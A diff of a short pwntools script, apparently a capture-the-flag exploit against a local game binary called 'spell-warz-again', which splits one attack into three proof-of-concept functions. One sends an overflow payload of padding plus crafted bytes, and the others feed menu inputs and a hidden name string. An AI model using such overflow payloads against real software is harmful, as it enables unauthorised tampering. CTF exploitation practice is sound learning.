@@ -1,9 +1,10 @@
-from pwn import *
+from pwn import process
 
-if __name__ == "__main__":
-    p = process("./main")
+
+def poc0():
+    p = process("./spell-warz-again")
     print p.recvuntil(">")
-    p.sendline(("A" * 16) + ("\xff\xff\xff\x0f\x01"))
+    p.sendline(("A" * 32) + ("\x11\x11\x11\x11\x11\x11\x11\x11\x01"))
     print p.recvuntil(">")
     p.sendline("y")
     print p.recvuntil(">")
@@ -12,7 +13,46 @@ if __name__ == "__main__":
     p.sendline("4")
     print p.recvuntil(">")
     p.sendline("y")
-    for i in xrange(99):
+    for _ in xrange(10):
         print p.recvuntil(">")
-        p.sendline("9")
+        p.sendline("100")
     p.interactive()
+
+
+def poc1():
+    p = process("./spell-warz-again")
+    print p.recvuntil(">")
+    p.sendline("Leo")
+    print p.recvuntil(">")
+    p.sendline("y")
+    print p.recvuntil(">")
+    p.sendline("2")
+    print p.recvuntil(">")
+    p.sendline("4")
+    print p.recvuntil(">")
+    p.sendline("y")
+    print p.recvuntil(">")
+    p.sendline("0")
+    p.interactive()
+
+
+def poc2():
+    p = process("./spell-warz-again")
+    print p.recvuntil(">")
+    p.sendline("__th3_w0rLd_D3str0Y3r__")
+    print p.recvuntil(">")
+    p.sendline("y")
+    print p.recvuntil(">")
+    p.sendline("2")
+    print p.recvuntil(">")
+    p.sendline("4")
+    print p.recvuntil(">")
+    p.sendline("y")
+    for _ in xrange(10):
+        print p.recvuntil(">")
+        p.sendline("100")
+    p.interactive()
+
+
+if __name__ == "__main__":
+    poc0()
